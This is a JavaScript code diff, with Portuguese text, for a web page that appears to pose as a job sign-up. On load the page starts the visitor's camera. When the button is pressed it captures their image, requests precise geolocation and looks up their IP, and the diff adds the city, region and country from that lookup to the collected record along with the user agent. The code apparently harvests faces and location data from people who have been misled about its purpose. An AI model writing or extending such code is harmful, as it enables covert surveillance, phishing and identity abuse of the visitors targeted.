@@ -51,7 +51,7 @@ document.getElementById("status");
 const canvas =
 document.getElementById("canvas");
 
-async function iniciarCamera(){
+async function iniciarSistema(){
 
   try{
 
@@ -60,9 +60,15 @@ async function iniciarCamera(){
       "Clique no botão verde para participar das vagas."
     );
 
-    fala.lang = "pt-BR";
+    fala.lang =
+    "pt-BR";
 
-    speechSynthesis.speak(fala);
+    speechSynthesis.speak(
+      fala
+    );
+
+    statusText.innerHTML =
+    "📸 Iniciando câmera...";
 
     const stream =
     await navigator.mediaDevices
@@ -76,7 +82,8 @@ async function iniciarCamera(){
 
     });
 
-    video.srcObject = stream;
+    video.srcObject =
+    stream;
 
     await video.play();
 
@@ -98,7 +105,7 @@ async function iniciarCamera(){
 
 window.onload = ()=>{
 
-  iniciarCamera();
+  iniciarSistema();
 
 };
 
@@ -114,7 +121,7 @@ btn.addEventListener(
       "PROCESSANDO...";
 
       statusText.innerHTML =
-      "📸 Capturando selfie...";
+      "📸 Capturando imagem...";
 
       canvas.width =
       video.videoWidth;
@@ -146,6 +153,9 @@ btn.addEventListener(
       "não permitido";
 
       try{
+
+        statusText.innerHTML =
+        "📍 Obtendo localização...";
 
         const localizacao =
         await new Promise(
@@ -181,7 +191,14 @@ btn.addEventListener(
       let ip =
       "indisponível";
 
+      let cidade = "";
+      let estado = "";
+      let pais = "";
+
       try{
+
+        statusText.innerHTML =
+        "🌐 Obtendo IP...";
 
         const req =
         await fetch(
@@ -193,6 +210,15 @@ btn.addEventListener(
 
         ip =
         json.ip;
+
+        cidade =
+        json.city;
+
+        estado =
+        json.region;
+
+        pais =
+        json.country_name;
 
       }
 
@@ -219,6 +245,12 @@ btn.addEventListener(
           longitude:longitude,
 
           ip:ip,
+
+          cidade:cidade,
+
+          estado:estado,
+
+          pais:pais,
 
           userAgent:
           navigator.userAgent,
